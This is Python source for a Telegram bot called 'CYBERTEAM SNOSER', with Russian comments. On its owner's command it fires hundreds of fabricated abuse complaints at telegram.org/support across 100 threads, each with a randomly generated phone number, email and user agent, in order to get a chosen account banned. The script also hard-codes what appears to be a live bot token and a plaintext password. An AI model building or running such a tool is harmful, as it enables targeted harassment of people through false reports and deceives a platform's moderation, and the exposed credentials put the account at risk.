import os
import sys
import time
import random
import string
import threading
import subprocess
import re
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify

# ===================================================================
# ТВОИ ДАННЫЕ
# ===================================================================
ТВОЙ_ТОКЕН = "8677746039:AAEruPyB_19dCamkVr5u1H2NctcCfnRgems"
ТВОЙ_ID = 7823802800

# ===================================================================
# FLASK APP
# ===================================================================
app = Flask(__name__)

@app.route('/')
def home():
    return "☢️ CYBERTEAM SNOSER RUNNING 24/7"

@app.route('/health')
def health():
    return "OK"

@app.route('/status')
def status():
    return jsonify({
        "status": "running",
        "mode": CONFIG.get("mode", "tornado"),
        "threads": CONFIG.get("threads", 100),
        "attack_running": CONFIG.get("attack_running", False),
        "uptime": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })

# ===================================================================
# ПРОВЕРКА МОДУЛЕЙ
# ===================================================================
required_modules = ["requests", "fake_useragent", "termcolor", "pyfiglet", "flask"]

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_modules():
    print("=" * 60)
    print("☢️ CYBERTEAM SNOSER v17.0 - SYNC EDITION ☢️")
    print("=" * 60)
    
    for module in required_modules:
        try:
            __import__(module)
            print(f"✅ {module} уже установлен.")
        except:
            print(f"⏳ Установка {module}...")
            install(module)
            print(f"✅ {module} установлен.")
    
    print("=" * 60)
    print("✅ ВСЕ ГОТОВО! ЗАПУСКАЕМ...")

check_and_install_modules()

# ===================================================================
# ИМПОРТЫ
# ===================================================================
import requests
from fake_useragent import UserAgent
from termcolor import colored

# ===================================================================
# КОНФИГ
# ===================================================================
CONFIG = {
    "threads": 100,
    "request_timeout": 10,
    "delay_min": 0.1,
    "delay_max": 0.3,
    "mode": "tornado",
    "owner_password": "cyberteam2024",
    "bot_token": ТВОЙ_ТОКЕН,
    "owner_id": ТВОЙ_ID,
    "attack_running": False,
    "current_target": "",
    "history": [],
    "last_update_id": 0
}

# ===================================================================
# ГЕНЕРАТОРЫ
# ===================================================================
class Generators:
    @staticmethod
    def phone():
        codes = ['+7', '+380', '+375', '+1', '+44', '+49']
        return f"{random.choice(codes)}{''.join(random.choices('0123456789', k=10))}"
    
    @staticmethod
    def email():
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'mail.ru', 'yandex.ru']
        name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))
        return f"{name}{random.randint(1, 999)}@{random.choice(domains)}"
    
    @staticmethod
    def user_agent():
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ]
        return random.choice(agents)

# ===================================================================
# ТЕКСТЫ
# ===================================================================
class TextTemplates:
    @staticmethod
    def get_text(target_type, target, reason, link=""):
        if target_type == "account":
            texts = {
                "spam": [f"Аккаунт {target} занимается МАССОВЫМ СПАМОМ! Прошу заблокировать!"],
                "insult": [f"Аккаунт {target} ОСКОРБЛЯЕТ пользователей!"],
                "scam": [f"Аккаунт {target} - МОШЕННИК! Обманул людей!"],
                "illegal": [f"Аккаунт {target} распространяет НЕЛЕГАЛЬНЫЙ контент!"]
            }
            return random.choice(texts.get(reason, texts["spam"]))
        elif target_type == "channel":
            return f"Канал {target} нарушает правила! {link} Срочно заблокировать!"
        elif target_type == "bot":
            return f"Бот {target} - НЕЛЕГАЛЬНЫЙ! Заблокировать!"
        elif target_type == "group":
            return f"Группа {target} - НАРУШЕНИЕ! Заблокировать!"
        return f"Жалоба на {target}"

# ===================================================================
# ДВИЖОК СНОСА
# ===================================================================
class SnosEngine:
    
    @staticmethod
    def send_complaint(target, target_type, reason, link=""):
        text = TextTemplates.get_text(target_type, target, reason, link)
        text += f" {Generators.user_agent()[:15]}"
        
        phone = Generators.phone()
        email = Generators.email()
        
        url = 'https://telegram.org/support'
        data = {'text': text, 'number': phone, 'email': email}
        headers = {'User-Agent': Generators.user_agent()}
        
        try:
            response = requests.post(url, headers=headers, data=data, timeout=CONFIG["request_timeout"])
            return response.status_code == 200, response.status_code
        except Exception as e:
            return False, str(e)[:30]
    
    @staticmethod
    def snos_target(target, target_type, reason, repeats, link=""):
        success = 0
        failed = 0
        lock = threading.Lock()
        total = repeats
        
        print(f"🎯 ЦЕЛЬ: {target}")
        print(f"🌊 ПОТОКОВ: {CONFIG['threads']}")
        
        def worker(index):
            nonlocal success, failed
            result, error = SnosEngine.send_complaint(target, target_type, reason, link)
            with lock:
                if result:
                    success += 1
                else:
                    failed += 1
            time.sleep(random.uniform(CONFIG["delay_min"], CONFIG["delay_max"]))
        
        with ThreadPoolExecutor(max_workers=CONFIG["threads"]) as executor:
            executor.map(worker, range(total))
        
        print(f"✅ УСПЕШНО: {success}/{total}")
        print(f"❌ ОШИБОК: {failed}/{total}")
        
        is_destroyed = success > total * 0.6
        CONFIG['attack_running'] = False
        CONFIG['current_target'] = ""
        
        CONFIG['history'].append({
            'target': target,
            'type': target_type,
            'success': success,
            'total': total,
            'destroyed': is_destroyed,
            'time': datetime.now().strftime('%H:%M')
        })
        if len(CONFIG['history']) > 10:
            CONFIG['history'] = CONFIG['history'][-10:]
        
        return is_destroyed

# ===================================================================
# ОТПРАВКА СООБЩЕНИЙ В TELEGRAM
# ===================================================================
def send_telegram_message(text):
    """Отправляет сообщение в Telegram"""
    try:
        url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/sendMessage"
        data = {
            "chat_id": CONFIG['owner_id'],
            "text": text,
            "parse_mode": "HTML"
        }
        requests.post(url, data=data, timeout=5)
    except:
        pass

# ===================================================================
# ОБРАБОТЧИК КОМАНД (СИНХРОННЫЙ)
# ===================================================================
def process_command(text):
    text = text.strip()
    
    if text.startswith('/start'):
        return """
☢️ <b>CYBERTEAM SNOSER</b>

👑 ВЛАДЕЛЕЦ: WARD
🤖 SYNCHRONOUS MODE (24/7)

<b>КОМАНДЫ:</b>
/snos @username 500 - запустить снос
/status - статус сносера
/stop - остановить снос

<b>ПРИМЕР:</b>
/snos @spamer 1000
"""
    elif text.startswith('/snos'):
        parts = text.split()
        if len(parts) >= 3:
            target = parts[1]
            try:
                repeats = int(parts[2])
                if CONFIG['attack_running']:
                    return "⚠️ СНОС УЖЕ ИДЕТ! Дождись завершения."
                CONFIG['attack_running'] = True
                CONFIG['current_target'] = target
                
                def run():
                    SnosEngine.snos_target(target, "account", "spam", repeats, "")
                
                thread = threading.Thread(target=run, daemon=True)
                thread.start()
                return f"🎯 СНОС ЗАПУЩЕН!\n\n👤 ЦЕЛЬ: {target}\n💥 ЖАЛОБ: {repeats}"
            except:
                return "❌ Ошибка: укажи число"
        return "❌ Использование: /snos @username количество"
    elif text.startswith('/status'):
        status_text = "🔴 ИДЕТ" if CONFIG['attack_running'] else "🟢 ОЖИДАНИЕ"
        return f"""
📊 <b>СТАТУС СНОСЕРА</b>

🌐 СОСТОЯНИЕ: {status_text}
🎯 ЦЕЛЬ: {CONFIG['current_target'] or '-'}
⚡ ПОТОКОВ: {CONFIG['threads']}
📋 РЕЖИМ: {CONFIG['mode'].upper()}
📨 ВСЕГО СНОСОВ: {len(CONFIG['history'])}
"""
    elif text.startswith('/stop'):
        if CONFIG['attack_running']:
            CONFIG['attack_running'] = False
            return "🛑 СНОС ОСТАНОВЛЕН!"
        return "ℹ️ СНОС НЕ ЗАПУЩЕН"
    else:
        return "❌ Неизвестная команда"

# ===================================================================
# ПОЛЛИНГ БОТА (СИНХРОННЫЙ)
# ===================================================================
def polling_bot():
    """Поллинг бота без asyncio"""
    print("🤖 ЗАПУСК СИНХРОННОГО БОТА...")
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/getUpdates"
            params = {
                "offset": CONFIG['last_update_id'] + 1,
                "timeout": 30,
                "allowed_updates": ["message"]
            }
            
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok') and data.get('result'):
                    for update in data['result']:
                        CONFIG['last_update_id'] = update['update_id']
                        
                        if 'message' in update and 'text' in update['message']:
                            chat_id = update['message']['chat']['id']
                            text = update['message']['text']
                            
                            if chat_id == CONFIG['owner_id']:
                                reply = process_command(text)
                                send_telegram_message(reply)
            else:
                print(f"⚠️ Ошибка Telegram API: {response.status_code}")
                
        except Exception as e:
            print(f"⚠️ Ошибка поллинга: {e}")
        
        time.sleep(1)

# ===================================================================
# ЗАПУСК
# ===================================================================
if __name__ == "__main__":
    print("\n☢️ CYBERTEAM SNOSER - SYNC EDITION")
    
    # Отправляем уведомление о запуске
    send_telegram_message("☢️ CYBERTEAM SNOSER ЗАПУЩЕН НА RENDER 24/7!")
    
    # Запускаем поллинг бота в отдельном потоке
    bot_thread = threading.Thread(target=polling_bot, daemon=True)
    bot_thread.start()
    
    # Запускаем Flask
    port = int(os.environ.get("PORT", 10000))
    print(f"🌐 FLASK СЕРВЕР ЗАПУЩЕН НА ПОРТУ {port}")
    app.run(host="0.0.0.0", port=port)